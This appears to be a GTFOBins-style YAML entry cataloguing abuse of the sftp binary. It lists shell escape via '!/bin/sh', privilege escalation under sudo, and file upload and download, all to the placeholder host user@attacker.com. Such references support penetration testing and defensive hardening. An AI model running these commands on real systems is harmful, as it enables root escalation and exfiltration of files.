---
functions:
  execute-interactive:
    - code: |
        HOST=user@attacker.com
        sftp $HOST
        !/bin/sh
  sudo-enabled:
    - code: |
        HOST=user@attacker.com
        sudo sftp $HOST
        !/bin/sh
  upload:
    - description: Send local file to a SSH server.
      code: |
        RHOST=user@attacker.com
        sftp $RHOST
        put file_to_send where_to_save
  download:
    - description: Fetch a remote file from a SSH server.
      code: |
        RHOST=user@attacker.com
        sftp $RHOST
        get file_to_get where_to_save
---